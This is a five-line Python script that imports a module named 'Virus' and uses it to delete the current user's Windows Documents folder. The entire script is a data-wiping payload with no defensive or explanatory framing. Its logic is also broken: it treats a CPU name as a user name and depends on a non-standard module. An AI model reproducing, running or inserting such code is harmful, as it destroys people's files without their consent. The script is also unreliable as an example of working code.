import Virus
user = Virus.getCPUname()
Form = "C:/users/{}/documents"
APD = Form.format(user)
Virus.delete(APD)
